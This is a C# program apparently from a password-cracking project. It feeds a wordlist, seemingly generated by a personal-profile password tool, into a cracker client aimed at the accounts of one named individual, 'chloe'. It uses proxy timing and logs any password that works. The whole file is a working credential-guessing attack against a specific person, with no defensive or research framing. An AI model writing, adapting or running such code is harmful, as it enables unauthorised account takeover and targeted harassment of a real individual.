using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading.Tasks;

namespace CrackingLib
{
    class Program
    {
        static void Main(string[] args)
        {
            CrackerClient client = new CrackerClient("urbrochlo", "chloe.br", "chloes__covers");
            var passwords = File.ReadLines(@"C:\Users\ZACH-GAMING\Documents\TEMP\cupp-master\chloe.txt");
            foreach(var password in passwords)
            {
                if (client.TryPasswordVariant(password))
                {
                    Console.WriteLine("!!!PASSWORD FOUND!!!\t\t\"" + password + "\"");
                    File.AppendAllText("chloe.txt", password);
                    client.SaveProxyTimes();
                }
            }
            client.SaveProxyTimes();
            Console.ReadLine();
        }
    }
}
